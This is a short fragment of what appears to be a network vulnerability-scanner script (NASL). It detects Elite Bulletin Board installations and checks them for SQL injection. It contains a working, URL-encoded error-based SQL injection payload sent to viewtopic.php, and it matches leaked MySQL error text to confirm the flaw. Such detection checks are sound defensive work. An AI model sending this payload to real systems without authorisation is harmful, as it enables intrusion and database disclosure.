...
for dir in nasl_make_list_unique( "/", "/ebbv", "/ebbv2", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/index.php";
	...
	if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, ">Elite Bulletin Board<" )){
		url = dir + "/viewtopic.php/%27,%28%28select*from%28select%20" + "name_const%28version%28%29,1%29,name_co%20nst%28version%28%29" + ",1%29%29a%29%29%29%20--%20/?bid=1&tid=1";
		if(http_vuln_check( port: port, url: url, pattern: "/includes/db.php", extra_check: make_list( "MySQL server",
			 "SQL Command",
			 "Grouplist" ) )){
